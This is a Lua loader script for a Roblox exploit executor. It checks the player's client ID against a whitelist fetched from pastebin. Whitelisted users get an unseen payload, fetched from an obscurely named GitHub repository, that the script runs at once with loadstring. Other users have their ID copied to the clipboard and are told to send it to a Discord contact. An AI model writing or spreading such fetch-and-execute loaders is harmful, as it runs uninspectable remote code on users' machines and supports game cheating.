local HWIDTable = loadstring(game:HttpGet('https://pastebin.com/raw/Xe7M8yBw'))()
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
local hint = Instance.new("Hint",game.CoreGui)
for i,v in pairs(HWIDTable) do
   if v == HWID then
      hint.Text = "Your HWID is whitelisted! Executing now."
      delay(5,function() hint:destroy() end)
      loadstring(game:HttpGet('https://raw.githubusercontent.com/weewoowaawaa/aeuohnuonouaerbhhide/main/main.lua'))()
else
    hint.Text = "HWID copied to clipboard. Please give heqds#2146 your HWID in your ticket."
    delay(5,function() hint:destroy() end)
    setclipboard(game:GetService("RbxAnalyticsService"):GetClientId())
   end
end

